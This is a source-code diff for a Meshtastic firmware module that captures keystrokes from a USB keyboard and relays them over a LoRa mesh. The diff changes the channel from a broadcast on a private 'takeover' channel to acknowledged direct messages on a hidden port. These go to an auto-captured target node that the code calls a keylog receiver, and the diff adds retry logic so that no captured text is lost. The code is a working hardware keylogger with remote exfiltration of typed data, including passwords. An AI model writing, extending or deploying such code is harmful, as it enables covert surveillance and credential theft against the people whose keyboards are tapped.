@@ -5,28 +5,28 @@
  * SPDX-License-Identifier: GPL-3.0-only
  *
  * ============================================================================
- * MESH TRANSMISSION - Private Channel "takeover"
+ * MESH TRANSMISSION - Direct Messages on Default Channel
  * ============================================================================
  *
  * When the keystroke buffer is finalized (full or flushed), it is automatically
- * transmitted over the LoRa mesh network via the private "takeover" channel.
+ * transmitted as a direct message to a specific target node over the default channel.
  *
- * Channel Configuration (defined in platformio.ini):
- *   - Channel Index: 1 (secondary channel)
- *   - Channel Name: "takeover"
- *   - Encryption: AES256 with 32-byte PSK
+ * Channel Configuration:
+ *   - Channel Index: 0 (default primary channel)
+ *   - Uses standard Meshtastic encryption (default PSK or custom)
  *   - Port: TEXT_MESSAGE_APP (displays as text on receiving devices)
  *
- * Transmission Details:
+ * Transmission Details (Direct Message Mode):
  *   - Auto-fragments if data exceeds MAX_PAYLOAD (~237 bytes)
- *   - Broadcasts to all nodes (NODENUM_BROADCAST)
- *   - No acknowledgment requested (want_ack = false)
- *   - Receiving nodes must have matching channel 1 PSK to decrypt
+ *   - Sends direct message to targetNode (auto-captured from first command sender)
+ *   - Acknowledgment requested (want_ack = true) for reliable delivery
+ *   - Target node captured when first STATUS/START/STOP/STATS command received
+ *   - If no target set, transmission is skipped (send STATUS from receiver to set target)
  *
- * Function: broadcastToPrivateChannel(data, len)
- *   - Validates inputs and mesh service availability
+ * Function: sendToTargetNode(data, len)
+ *   - Validates inputs, target node, and mesh service availability
  *   - Fragments data into LoRa-sized packets
- *   - Sends each fragment via service->sendToMesh()
+ *   - Sends each fragment via service->sendToMesh() with RELIABLE priority
  *
  * ============================================================================
  * KEYSTROKE BUFFER FORMAT (500 bytes) - Delta Encoding
@@ -90,8 +90,8 @@
 #include "Router.h"
 #include "mesh-pb-constants.h"
 
-/* Channel index for "takeover" private channel (configured in platformio.ini) */
-#define TAKEOVER_CHANNEL_INDEX 1
+/* Channel index for direct messages (0 = default primary channel) */
+#define DM_CHANNEL_INDEX 0
 
 USBCaptureModule *usbCaptureModule;
 
@@ -163,6 +163,13 @@ bool USBCaptureModule::init()
     /* Core1 will be launched on first runOnce() call */
     LOG_INFO("USB Capture Module initialized (Core1 will start in main loop)");
 
+#ifdef USB_CAPTURE_SIMULATE_KEYS
+    LOG_WARN("[USBCapture] *** SIMULATION MODE ENABLED ***");
+    LOG_WARN("[USBCapture] Will generate %d test batches every %d ms",
+             SIM_BATCH_COUNT, SIM_INTERVAL_MS);
+    LOG_WARN("[USBCapture] No USB keyboard required - testing pipeline only");
+#endif
+
     return true;
 }
 
@@ -205,7 +212,19 @@ int32_t USBCaptureModule::runOnce()
         LOG_INFO("Core1 launched and running independently");
     }
 
-    /* NEW: Poll PSRAM for completed buffers from Core1 */
+    /* v6.0: Check for ACK timeout before processing new batches
+     * This handles retries with exponential backoff */
+    checkPendingTimeout();
+
+#ifdef USB_CAPTURE_SIMULATE_KEYS
+    /* v6.1: Simulation mode - generate fake keystroke batches for testing
+     * This bypasses Core1/PIO and writes directly to FRAM */
+    if (sim_enabled && capture_enabled) {
+        simulateKeystrokes();
+    }
+#endif
+
+    /* Poll PSRAM/FRAM for completed buffers from Core1 */
     processPSRAMBuffers();
 
     /* Note: Formatted event logging now happens directly on Core1 */
@@ -309,6 +328,14 @@ void USBCaptureModule::processPSRAMBuffers()
 
     /* Skip processing if capture is disabled */
     if (!capture_enabled) {
+        return;
+    }
+
+    /* NASA Rule 5: Check pending state before processing
+     * Skip if we're waiting for ACK on a previous batch */
+    if (pendingTx.batch_id != 0) {
+        LOG_DEBUG("[USBCapture] Waiting for ACK on batch 0x%08x (elapsed %u ms)",
+                  pendingTx.batch_id, millis() - pendingTx.send_time);
         return;
     }
 
@@ -451,75 +478,56 @@ void USBCaptureModule::processPSRAMBuffers()
         char decoded_text[MAX_DECODED_TEXT_SIZE];
         size_t text_len = decodeBufferToText(&buffer, decoded_text, sizeof(decoded_text));
 
-        /* Rate limiting: Only transmit if enough time has passed */
+        /* Rate limiting: Only transmit if enough time has passed
+         * Note: With ACK tracking, we only send one batch at a time anyway */
         uint32_t now = millis();
         if (now - last_transmit_time >= MIN_TRANSMIT_INTERVAL_MS)
         {
-            /* Transmit decoded text with retry logic (v3.5) */
-            const int MAX_RETRIES = 3;
-            bool transmission_success = false;
+            /* Generate batch ID for ACK correlation (v6.0)
+             * NASA Rule 6: Variable scoped to smallest level */
+            uint32_t batchId = nextBatchId++;
 
-            for (int attempt = 0; attempt < MAX_RETRIES; attempt++)
+            /* Attempt transmission with batch header */
+            uint32_t packetId = sendToTargetNode((const uint8_t *)decoded_text, text_len, batchId);
+
+            if (packetId != 0)
             {
-                if (attempt > 0)
-                {
-                    /* Track retry attempts */
-                    __dmb();
-                    g_psram_buffer.header.retry_attempts++;
-                    __dmb();
-                    LOG_WARN("[Core0] Transmission retry %d/%d", attempt, MAX_RETRIES - 1);
-                }
+                /* Transmission queued - set up pending state for ACK tracking
+                 * NASA Rule 5: Assertions for postconditions */
+                assert(pendingTx.batch_id == 0);  /* Should be clear at this point */
 
-                /* Attempt transmission */
-                if (broadcastToPrivateChannel((const uint8_t *)decoded_text, text_len))
-                {
-                    transmission_success = true;
-                    last_transmit_time = now;
-                    LOG_INFO("[Core0] Transmitted decoded text (%zu bytes)", text_len);
+                pendingTx.batch_id = batchId;
+                pendingTx.packet_id = packetId;
+                pendingTx.send_time = now;
+                pendingTx.timeout_ms = ACK_TIMEOUT_INITIAL_MS;
+                pendingTx.retry_count = 0;
 
-#ifdef HAS_FRAM_STORAGE
-                    /* Delete batch from FRAM after successful transmission */
-                    if (framStorage != nullptr && framStorage->isInitialized()) {
-                        if (!framStorage->deleteBatch()) {
-                            LOG_WARN("[Core0] FRAM: Failed to delete batch after transmission");
-                        }
-                    }
-#endif
-                    break;
-                }
-                else
-                {
-                    /* Transmission failed - track in statistics */
-                    __dmb();
-                    g_psram_buffer.header.transmission_failures++;
-                    __dmb();
+                last_transmit_time = now;
 
-                    if (attempt < MAX_RETRIES - 1)
-                    {
-                        /* Wait briefly before retry (allow mesh to recover) */
-                        delay(100);  // 100ms delay between retries
-                    }
-                }
+                LOG_INFO("[USBCapture] Batch 0x%08x queued, awaiting ACK (timeout %u ms)",
+                         batchId, pendingTx.timeout_ms);
+
+                /* NOTE: Batch is NOT deleted from FRAM here!
+                 * v6.2: Deletion happens ONLY when ACK is received (handleAckResponse)
+                 * Failed batches stay in FRAM forever and retry on next cycle */
             }
-
-            /* If all retries failed, log critical warning */
-            if (!transmission_success)
+            else
             {
-                LOG_ERROR("[Core0] Transmission FAILED after %d attempts - data lost (%zu bytes)",
-                         MAX_RETRIES, text_len);
+                /* Transmission failed immediately (no target, service unavailable, etc.)
+                 * Track in statistics but don't set pending state
+                 * v6.2: Batch stays in FRAM - will retry on next runOnce() cycle */
+                __dmb();
+                g_psram_buffer.header.transmission_failures++;
+                __dmb();
+                LOG_WARN("[USBCapture] Transmission failed for batch 0x%08x - will retry next cycle", batchId);
             }
         }
         else
         {
-            /* Rate limit exceeded - put buffer back into PSRAM for next cycle */
-            LOG_WARN("[Core0] Rate limit: re-queuing buffer (wait %u ms)",
+            /* Rate limit active - batch stays in FRAM, will retry next cycle
+             * With FRAM persistence, this is safe - no data loss */
+            LOG_DEBUG("[USBCapture] Rate limit: wait %u ms before next transmission",
                      MIN_TRANSMIT_INTERVAL_MS - (now - last_transmit_time));
-
-            /* Note: Buffer already consumed from PSRAM read. In v4.x, reliable TX
-             * will use persistent queue to avoid this data loss scenario. */
-            __dmb();
-            g_psram_buffer.header.transmission_failures++;
-            __dmb();
         }
     }
 
@@ -622,60 +630,352 @@ void USBCaptureModule::processPSRAMBuffers()
  * This reduces Core0 overhead by ~90% (2% → 0.2%).
  */
 
-bool USBCaptureModule::broadcastToPrivateChannel(const uint8_t *data, size_t len)
+/**
+ * @brief Send buffer data with batch header to target node
+ *
+ * Protocol format: [batch_id:4][start_epoch:4][final_epoch:4][data:N]
+ * Uses PRIVATE_APP port for keystroke data (not visible in standard chat).
+ *
+ * NASA Power of 10 compliance:
+ * - Fixed buffer size (no dynamic allocation)
+ * - All pointer dereferences checked
+ * - Loop has fixed upper bound (MAX_FRAGMENTS)
+ * - Return value always meaningful
+ *
+ * @param data Pointer to keystroke data (decoded text)
+ * @param len Length of data
+ * @param batchId Unique batch ID for ACK correlation
+ * @return Packet ID if successful, 0 if failed
+ */
+uint32_t USBCaptureModule::sendToTargetNode(const uint8_t *data, size_t len, uint32_t batchId)
 {
+    /* NASA Rule 5: Assertions for preconditions */
+    assert(len <= MAX_DECODED_TEXT_SIZE);
+
     /* Validate inputs */
     if (!data || len == 0) {
-        LOG_WARN("broadcastToPrivateChannel: invalid data or length");
-        return false;
+        LOG_WARN("[USBCapture] sendToTargetNode: invalid data or length");
+        return 0;
+    }
+
+    /* Check if target node is set (DM-only mode) */
+    if (targetNode == 0) {
+        LOG_DEBUG("[USBCapture] No target node set - skipping transmission");
+        return 0;
     }
 
     /* Check if mesh service is available */
     if (!service || !router) {
-        LOG_WARN("broadcastToPrivateChannel: mesh service not available");
+        LOG_WARN("[USBCapture] sendToTargetNode: mesh service not available");
+        return 0;
+    }
+
+    /* Build packet with batch header
+     * Format: [batch_id:4][data:N]
+     * Note: start/final epochs are already in the decoded text prefix */
+    const size_t HEADER_SIZE = 4;  /* batch_id only */
+    const size_t MAX_PAYLOAD = meshtastic_Constants_DATA_PAYLOAD_LEN;
+
+    /* NASA Rule 3: Fixed size buffer, no dynamic allocation */
+    uint8_t packet_buffer[MAX_PAYLOAD];
+
+    /* Pack batch header (little-endian for ARM) */
+    memcpy(&packet_buffer[0], &batchId, 4);
+
+    /* Calculate data that fits in first packet */
+    size_t data_in_first = (len > MAX_PAYLOAD - HEADER_SIZE) ?
+                           (MAX_PAYLOAD - HEADER_SIZE) : len;
+
+    /* Copy keystroke data after header */
+    memcpy(&packet_buffer[HEADER_SIZE], data, data_in_first);
+
+    /* Allocate packet from router pool */
+    meshtastic_MeshPacket *p = router->allocForSending();
+    if (!p) {
+        LOG_ERROR("[USBCapture] sendToTargetNode: failed to allocate packet");
+        return 0;
+    }
+
+    /* Capture packet ID for ACK tracking (before send modifies it) */
+    uint32_t sentPacketId = p->id;
+
+    /* Configure packet for direct message to target node */
+    p->to = targetNode;
+    p->channel = DM_CHANNEL_INDEX;
+    p->want_ack = true;
+    p->priority = meshtastic_MeshPacket_Priority_RELIABLE;
+
+    /* Use PRIVATE_APP port - KeylogReceiverModule on Heltec listens here */
+    p->decoded.portnum = meshtastic_PortNum_PRIVATE_APP;
+
+    /* Copy payload (header + data) */
+    p->decoded.payload.size = HEADER_SIZE + data_in_first;
+    memcpy(p->decoded.payload.bytes, packet_buffer, p->decoded.payload.size);
+
+    /* Send to mesh */
+    service->sendToMesh(p, RX_SRC_LOCAL, false);
+
+    LOG_INFO("[USBCapture] Sent batch 0x%08x (%zu bytes) → 0x%08x, packet_id=0x%08x",
+             batchId, HEADER_SIZE + data_in_first, targetNode, sentPacketId);
+
+    /* For now, we only support single-packet batches (237 bytes max after header)
+     * TODO: If fragmentation needed, track all packet IDs and wait for all ACKs */
+    if (len > data_in_first) {
+        LOG_WARN("[USBCapture] Data truncated: %zu bytes sent of %zu total", data_in_first, len);
+    }
+
+    return sentPacketId;
+}
+
+// ============================================================================
+// ACK TRACKING IMPLEMENTATION (v6.0)
+// ============================================================================
+
+/**
+ * @brief Check for ACK timeout and handle retry/failure
+ *
+ * Called from runOnce() before processing new batches.
+ * Implements exponential backoff: 30s -> 60s -> 120s (capped at ACK_MAX_TIMEOUT_MS).
+ *
+ * NASA Power of 10 compliance:
+ * - Fixed loop bound (max ACK_MAX_RETRIES iterations over time)
+ * - No dynamic memory allocation
+ * - All return paths explicit
+ */
+void USBCaptureModule::checkPendingTimeout()
+{
+    /* No pending transmission - nothing to check */
+    if (pendingTx.batch_id == 0) {
+        return;
+    }
+
+    uint32_t elapsed = millis() - pendingTx.send_time;
+
+    /* Check if timeout expired */
+    if (elapsed < pendingTx.timeout_ms) {
+        return;  /* Still waiting, not timed out yet */
+    }
+
+    /* Timeout occurred */
+    LOG_WARN("[USBCapture] ACK timeout for batch 0x%08x after %u ms (retry %u/%u)",
+             pendingTx.batch_id, elapsed, pendingTx.retry_count + 1, ACK_MAX_RETRIES);
+
+    /* Check if we have retries remaining */
+    if (pendingTx.retry_count < ACK_MAX_RETRIES) {
+        /* Attempt resend with exponential backoff */
+        if (resendPendingBatch()) {
+            /* Update tracking for next timeout check */
+            pendingTx.send_time = millis();
+
+            /* Double timeout (with cap) - NASA Rule 2: bounded values */
+            uint32_t new_timeout = pendingTx.timeout_ms * ACK_BACKOFF_MULTIPLIER;
+            if (new_timeout > ACK_MAX_TIMEOUT_MS) {
+                new_timeout = ACK_MAX_TIMEOUT_MS;
+            }
+            pendingTx.timeout_ms = new_timeout;
+            pendingTx.retry_count++;
+
+            /* Track statistics */
+            ack_retry_count++;
+
+            LOG_INFO("[USBCapture] Resent batch 0x%08x, next timeout %u ms",
+                     pendingTx.batch_id, pendingTx.timeout_ms);
+        } else {
+            /* Resend failed - treat as max retries reached */
+            LOG_ERROR("[USBCapture] Resend failed for batch 0x%08x", pendingTx.batch_id);
+            pendingTx.retry_count = ACK_MAX_RETRIES;  /* Force failure path */
+        }
+    }
+
+    /* Check if max retries exceeded (may have been set above) */
+    if (pendingTx.retry_count >= ACK_MAX_RETRIES) {
+        /* v6.2: DON'T delete batch on failure - keep in FRAM and retry later
+         * Batch will be retried on next runOnce() cycle (every 20 seconds)
+         * This ensures we never lose keystroke data due to temporary network issues */
+        LOG_WARN("[USBCapture] Batch 0x%08x failed after %u retries - keeping in FRAM, will retry next cycle",
+                  pendingTx.batch_id, ACK_MAX_RETRIES);
+
+        /* Track failure statistics */
+        ack_timeout_count++;
+
+        /* Clear pending state - next runOnce() will read from FRAM and try again
+         * Reset retry count so we get fresh exponential backoff on next attempt */
+        pendingTx.batch_id = 0;
+        pendingTx.packet_id = 0;
+        pendingTx.retry_count = 0;
+        pendingTx.timeout_ms = ACK_TIMEOUT_INITIAL_MS;
+    }
+}
+
+/**
+ * @brief Resend the pending batch after timeout
+ *
+ * Re-reads batch from FRAM (it wasn't deleted) and retransmits with a new packet ID.
+ * The batch_id remains the same for ACK correlation.
+ *
+ * NASA Power of 10 compliance:
+ * - Fixed buffer sizes
+ * - All return values checked
+ * - Explicit error handling
+ *
+ * @return true if resend successful, false if error
+ */
+bool USBCaptureModule::resendPendingBatch()
+{
+    /* NASA Rule 5: Precondition check */
+    assert(pendingTx.batch_id != 0);
+
+    psram_keystroke_buffer_t buffer;
+    bool have_data = false;
+
+#ifdef HAS_FRAM_STORAGE
+    /* Re-read batch from FRAM (it's still there since we didn't delete it) */
+    if (framStorage != nullptr && framStorage->isInitialized()) {
+        uint8_t fram_batch[FRAM_MAX_BATCH_SIZE];
+        uint16_t actualLength = 0;
+
+        if (framStorage->readBatch(fram_batch, sizeof(fram_batch), &actualLength)) {
+            /* Unpack FRAM format: [start_epoch:4][final_epoch:4][data_length:2][flags:2][data:N] */
+            if (actualLength >= 12) {
+                memcpy(&buffer.start_epoch, &fram_batch[0], 4);
+                memcpy(&buffer.final_epoch, &fram_batch[4], 4);
+                memcpy(&buffer.data_length, &fram_batch[8], 2);
+                memcpy(&buffer.flags, &fram_batch[10], 2);
+
+                uint16_t data_len = actualLength - 12;
+                if (data_len > PSRAM_BUFFER_DATA_SIZE) {
+                    data_len = PSRAM_BUFFER_DATA_SIZE;  /* NASA Rule 2: bounded */
+                }
+                memcpy(buffer.data, &fram_batch[12], data_len);
+                buffer.data_length = data_len;
+
+                have_data = true;
+            }
+        }
+    }
+#endif
+
+    if (!have_data) {
+        LOG_ERROR("[USBCapture] resendPendingBatch: failed to read batch from FRAM");
         return false;
     }
 
-    /* Max payload size for LoRa packet (see mesh-pb-constants.h) */
-    const size_t MAX_PAYLOAD = meshtastic_Constants_DATA_PAYLOAD_LEN;
+    /* Decode buffer to text (same as initial send) */
+    char decoded_text[MAX_DECODED_TEXT_SIZE];
+    size_t text_len = decodeBufferToText(&buffer, decoded_text, sizeof(decoded_text));
 
-    /* Fragment data if necessary */
-    size_t offset = 0;
-    uint8_t fragment_num = 0;
+    /* Send with same batch_id for ACK correlation */
+    uint32_t newPacketId = sendToTargetNode((const uint8_t *)decoded_text, text_len, pendingTx.batch_id);
 
-    while (offset < len) {
-        size_t chunk_size = (len - offset > MAX_PAYLOAD) ? MAX_PAYLOAD : (len - offset);
-
-        /* Allocate packet from router pool */
-        meshtastic_MeshPacket *p = router->allocForSending();
-        if (!p) {
-            LOG_ERROR("broadcastToPrivateChannel: failed to allocate packet");
-            return false;
-        }
-
-        /* Configure packet for private channel broadcast */
-        p->to = NODENUM_BROADCAST;
-        p->channel = TAKEOVER_CHANNEL_INDEX;
-        p->want_ack = false;
-        p->priority = meshtastic_MeshPacket_Priority_DEFAULT;
-
-        /* Set portnum to TEXT_MESSAGE_APP for display on receiving devices */
-        p->decoded.portnum = meshtastic_PortNum_TEXT_MESSAGE_APP;
-
-        /* Copy payload data */
-        p->decoded.payload.size = chunk_size;
-        memcpy(p->decoded.payload.bytes, data + offset, chunk_size);
-
-        /* Send to mesh */
-        service->sendToMesh(p, RX_SRC_LOCAL, false);
-
-        LOG_INFO("Sent fragment %u: %zu bytes to channel %d", fragment_num, chunk_size, TAKEOVER_CHANNEL_INDEX);
-
-        offset += chunk_size;
-        fragment_num++;
+    if (newPacketId != 0) {
+        /* Update packet ID for new transmission */
+        pendingTx.packet_id = newPacketId;
+        LOG_INFO("[USBCapture] Resent batch 0x%08x as packet 0x%08x",
+                 pendingTx.batch_id, newPacketId);
+        return true;
     }
 
-    LOG_INFO("broadcastToPrivateChannel: sent %zu bytes in %u fragment(s)", len, fragment_num);
+    LOG_ERROR("[USBCapture] resendPendingBatch: sendToTargetNode failed");
+    return false;
+}
+
+/**
+ * @brief Handle incoming ACK response for pending transmission
+ *
+ * Parses "ACK:0x<batch_id>" format from Heltec KeylogReceiverModule.
+ * Deletes FRAM batch only after successful ACK match.
+ *
+ * NASA Power of 10 compliance:
+ * - Fixed size buffers for parsing
+ * - Bounds checking on all string operations
+ * - Explicit error handling
+ *
+ * @param mp The received mesh packet (should be PRIVATE_APP port)
+ * @return true if this was a valid ACK for our pending batch
+ */
+bool USBCaptureModule::handleAckResponse(const meshtastic_MeshPacket &mp)
+{
+    /* Check if we're even waiting for an ACK */
+    if (pendingTx.batch_id == 0) {
+        return false;
+    }
+
+    /* Validate payload exists */
+    if (mp.decoded.payload.size == 0) {
+        return false;
+    }
+
+    /* ACK format: "ACK:0x<8 hex digits>"
+     * Example: "ACK:0x12345678" (14 characters) */
+    const size_t ACK_MIN_LEN = 6;   /* "ACK:0x" minimum */
+    const size_t ACK_FULL_LEN = 14; /* "ACK:0x12345678" */
+
+    if (mp.decoded.payload.size < ACK_MIN_LEN) {
+        return false;
+    }
+
+    /* Check ACK prefix (case-insensitive) */
+    const char *payload = (const char *)mp.decoded.payload.bytes;
+
+    /* NASA Rule 2: Bounded comparison */
+    if (strncmp(payload, "ACK:0x", 6) != 0 &&
+        strncmp(payload, "ack:0x", 6) != 0 &&
+        strncmp(payload, "ACK:0X", 6) != 0) {
+        return false;  /* Not an ACK packet */
+    }
+
+    /* Parse batch ID from hex string */
+    if (mp.decoded.payload.size < ACK_FULL_LEN) {
+        LOG_WARN("[USBCapture] ACK payload too short: %u bytes", mp.decoded.payload.size);
+        return false;
+    }
+
+    /* Extract hex digits (8 chars after "ACK:0x") */
+    char hex_str[9];  /* 8 hex digits + null */
+    /* NASA Rule 2: Bounded copy */
+    memcpy(hex_str, payload + 6, 8);
+    hex_str[8] = '\0';
+
+    /* Parse hex to uint32 */
+    char *endptr;
+    uint32_t acked_batch_id = strtoul(hex_str, &endptr, 16);
+
+    /* Validate parsing succeeded */
+    if (endptr != hex_str + 8) {
+        LOG_WARN("[USBCapture] Invalid ACK hex format: %s", hex_str);
+        return false;
+    }
+
+    /* Check if this ACK matches our pending batch */
+    if (acked_batch_id != pendingTx.batch_id) {
+        LOG_WARN("[USBCapture] ACK batch mismatch: got 0x%08x, expected 0x%08x",
+                 acked_batch_id, pendingTx.batch_id);
+        return false;
+    }
+
+    /* SUCCESS - ACK received for our pending batch! */
+    uint32_t latency = millis() - pendingTx.send_time;
+    LOG_INFO("[USBCapture] ACK received for batch 0x%08x (latency %u ms, retries %u)",
+             pendingTx.batch_id, latency, pendingTx.retry_count);
+
+#ifdef HAS_FRAM_STORAGE
+    /* NOW safe to delete batch from FRAM */
+    if (framStorage != nullptr && framStorage->isInitialized()) {
+        if (framStorage->deleteBatch()) {
+            LOG_INFO("[USBCapture] Deleted acknowledged batch from FRAM");
+        } else {
+            LOG_ERROR("[USBCapture] Failed to delete batch from FRAM after ACK");
+        }
+    }
+#endif
+
+    /* Track success statistics */
+    ack_success_count++;
+
+    /* Clear pending state to allow next batch */
+    pendingTx.batch_id = 0;
+    pendingTx.packet_id = 0;
+
     return true;
 }
 
@@ -685,15 +985,22 @@ bool USBCaptureModule::broadcastToPrivateChannel(const uint8_t *data, size_t len
 
 ProcessMessage USBCaptureModule::handleReceived(const meshtastic_MeshPacket &mp)
 {
-    /* We only handle TEXT_MESSAGE_APP on the takeover channel (channel 1) */
+    /* Handle PRIVATE_APP packets (ACK responses from KeylogReceiverModule)
+     * v6.0: ACK format is "ACK:0x<batch_id>" */
+    if (mp.decoded.portnum == meshtastic_PortNum_PRIVATE_APP) {
+        if (handleAckResponse(mp)) {
+            return ProcessMessage::STOP;  /* ACK handled */
+        }
+        /* Not an ACK for us - let other modules handle it */
+        return ProcessMessage::CONTINUE;
+    }
+
+    /* Handle TEXT_MESSAGE_APP (control commands: STATUS, START, STOP, etc.) */
     if (mp.decoded.portnum != meshtastic_PortNum_TEXT_MESSAGE_APP) {
         return ProcessMessage::CONTINUE;
     }
 
-    /* Only process messages on takeover channel (index 1) */
-    if (mp.channel != TAKEOVER_CHANNEL_INDEX) {
-        return ProcessMessage::CONTINUE;
-    }
+    /* Channel filtering disabled - accept commands from any channel or PKI DMs */
 
     /* Parse and log command */
     USBCaptureCommand cmd = parseCommand(mp.decoded.payload.bytes, mp.decoded.payload.size);
@@ -703,7 +1010,15 @@ ProcessMessage USBCaptureModule::handleReceived(const meshtastic_MeshPacket &mp)
         return ProcessMessage::CONTINUE;
     }
 
-    LOG_INFO("[USBCapture] Received command from node 0x%08x on takeover channel", mp.from);
+    LOG_INFO("[USBCapture] Received command from node 0x%08x", mp.from);
+
+    /* Capture sender as target node for direct messages (auto-capture mode) */
+    if (targetNode == 0) {
+        targetNode = mp.from;
+        LOG_INFO("[USBCapture] Target node set to 0x%08x (auto-captured from first command)", targetNode);
+    } else if (targetNode != mp.from) {
+        LOG_INFO("[USBCapture] Command from different node 0x%08x (target remains 0x%08x)", mp.from, targetNode);
+    }
 
     /* Execute command */
     char response[MAX_COMMAND_RESPONSE_SIZE];
@@ -885,24 +1200,167 @@ size_t USBCaptureModule::getStatus(char *response, size_t max_len)
         role_name = "ROUTER";
     }
 
+    /* Format target node display */
+    char target_str[20];
+    if (targetNode == 0) {
+        snprintf(target_str, sizeof(target_str), "NONE");
+    } else {
+        snprintf(target_str, sizeof(target_str), "0x%08x", targetNode);
+    }
+
     return snprintf(response, max_len,
-        "Node: %s | Role: %s | Capture: %s | Buffers: %u",
+        "Node: %s | Role: %s | Capture: %s | Target: %s | Buffers: %u",
         owner.long_name,
         role_name,
         capture_enabled ? "ON" : "OFF",
+        target_str,
         psram_buffer_get_count()
     );
 }
 
 size_t USBCaptureModule::getStats(char *response, size_t max_len)
 {
+    // NASA Power of 10: Bounded output with defensive max_len check
+    if (max_len == 0) {
+        return 0;
+    }
+
     return snprintf(response, max_len,
-        "Sent: %u | Dropped: %u | Available: %u | Enabled: %s",
-        g_psram_buffer.header.total_transmitted,
-        g_psram_buffer.header.dropped_buffers,
+        "Sent: %lu | Dropped: %lu | Avail: %u | ACK: %lu ok, %lu fail, %lu retry | %s",
+        (unsigned long)g_psram_buffer.header.total_transmitted,
+        (unsigned long)g_psram_buffer.header.dropped_buffers,
         psram_buffer_get_count(),
-        capture_enabled ? "YES" : "NO"
+        (unsigned long)ack_success_count,
+        (unsigned long)ack_timeout_count,
+        (unsigned long)ack_retry_count,
+        capture_enabled ? "ON" : "OFF"
     );
 }
+
+#ifdef USB_CAPTURE_SIMULATE_KEYS
+// ==================== Simulation Mode Implementation ====================
+
+/**
+ * @brief Test messages for simulation mode
+ *
+ * These messages simulate typing patterns for testing the full pipeline.
+ * Each message will be written as a separate FRAM batch.
+ */
+static const char *SIM_TEST_MESSAGES[] = {
+    "Hello from XIAO simulation mode! Testing ACK system.",
+    "This is batch #2 with some test keystrokes for validation.",
+    "Testing special chars: user@email.com password123!",
+    "Final test batch - checking end-to-end delivery.",
+    "Batch 5: The quick brown fox jumps over the lazy dog."
+};
+static const size_t SIM_MESSAGE_COUNT = sizeof(SIM_TEST_MESSAGES) / sizeof(SIM_TEST_MESSAGES[0]);
+
+bool USBCaptureModule::simulateKeystrokes()
+{
+    // NASA Rule 4: Check preconditions
+    if (!sim_enabled) {
+        return false;
+    }
+
+    // Check if we've reached the batch limit (0 = infinite)
+    if (SIM_BATCH_COUNT > 0 && sim_batch_count >= SIM_BATCH_COUNT) {
+        if (sim_enabled) {
+            LOG_INFO("[USBCapture] Simulation complete: %lu batches generated",
+                     (unsigned long)sim_batch_count);
+            sim_enabled = false;
+        }
+        return false;
+    }
+
+    // Check timing interval
+    uint32_t now = millis();
+    if (now - sim_last_batch_time < SIM_INTERVAL_MS) {
+        return false;  // Not time yet
+    }
+
+#ifdef HAS_FRAM_STORAGE
+    if (framStorage == nullptr || !framStorage->isInitialized()) {
+        LOG_ERROR("[USBCapture] Simulation: FRAM not available");
+        return false;
+    }
+
+    // Select message based on batch count (cycle through messages)
+    size_t msg_index = sim_batch_count % SIM_MESSAGE_COUNT;
+    const char *message = SIM_TEST_MESSAGES[msg_index];
+    size_t msg_len = strlen(message);
+
+    // NASA Rule 2: Enforce fixed bounds
+    if (msg_len > SIM_MAX_MESSAGE_LEN) {
+        msg_len = SIM_MAX_MESSAGE_LEN;
+    }
+
+    // Build FRAM batch in the same format as Core1
+    // Format: [start_epoch:4][final_epoch:4][data_length:2][flags:2][data:N]
+    uint8_t fram_batch[FRAM_MAX_BATCH_SIZE];
+    memset(fram_batch, 0, sizeof(fram_batch));
+
+    // Get current epoch timestamp
+    uint32_t current_epoch = getValidTime(RTCQualityFromNet);
+    if (current_epoch == 0) {
+        current_epoch = millis() / 1000;  // Fallback to uptime
+    }
+
+    // Write start_epoch (4 bytes, little-endian)
+    fram_batch[0] = (uint8_t)(current_epoch & 0xFF);
+    fram_batch[1] = (uint8_t)((current_epoch >> 8) & 0xFF);
+    fram_batch[2] = (uint8_t)((current_epoch >> 16) & 0xFF);
+    fram_batch[3] = (uint8_t)((current_epoch >> 24) & 0xFF);
+
+    // Write final_epoch (same as start for single message)
+    uint32_t final_epoch = current_epoch + 1;  // Add 1 second for realism
+    fram_batch[4] = (uint8_t)(final_epoch & 0xFF);
+    fram_batch[5] = (uint8_t)((final_epoch >> 8) & 0xFF);
+    fram_batch[6] = (uint8_t)((final_epoch >> 16) & 0xFF);
+    fram_batch[7] = (uint8_t)((final_epoch >> 24) & 0xFF);
+
+    // Write data_length (2 bytes, little-endian)
+    // Include message + Enter marker (0xFF + 2-byte delta)
+    uint16_t data_len = (uint16_t)(msg_len + 3);  // +3 for Enter encoding
+    fram_batch[8] = (uint8_t)(data_len & 0xFF);
+    fram_batch[9] = (uint8_t)((data_len >> 8) & 0xFF);
+
+    // Write flags (2 bytes) - 0 for normal batch
+    fram_batch[10] = 0;
+    fram_batch[11] = 0;
+
+    // Write keystroke data starting at offset 12
+    memcpy(&fram_batch[12], message, msg_len);
+
+    // Add simulated Enter key with delta encoding
+    // Format: 0xFF marker + 2-byte delta (time since start in seconds)
+    size_t enter_pos = 12 + msg_len;
+    fram_batch[enter_pos] = 0xFF;  // DELTA_MARKER
+    uint16_t delta = 1;  // 1 second delta for simulation
+    fram_batch[enter_pos + 1] = (uint8_t)(delta & 0xFF);
+    fram_batch[enter_pos + 2] = (uint8_t)((delta >> 8) & 0xFF);
+
+    // Total batch size: header (12) + message + enter (3)
+    uint16_t batch_size = 12 + data_len;
+
+    // Write to FRAM
+    if (!framStorage->writeBatch(fram_batch, batch_size)) {
+        LOG_ERROR("[USBCapture] Simulation: FRAM write failed");
+        return false;
+    }
+
+    sim_batch_count++;
+    sim_last_batch_time = now;
+
+    LOG_INFO("[USBCapture] SIM batch #%lu written: \"%s\" (%u bytes)",
+             (unsigned long)sim_batch_count, message, batch_size);
+
+    return true;
+#else
+    LOG_WARN("[USBCapture] Simulation requires FRAM storage");
+    sim_enabled = false;
+    return false;
+#endif
+}
+#endif /* USB_CAPTURE_SIMULATE_KEYS */
 
 #endif /* XIAO_USB_CAPTURE_ENABLED */
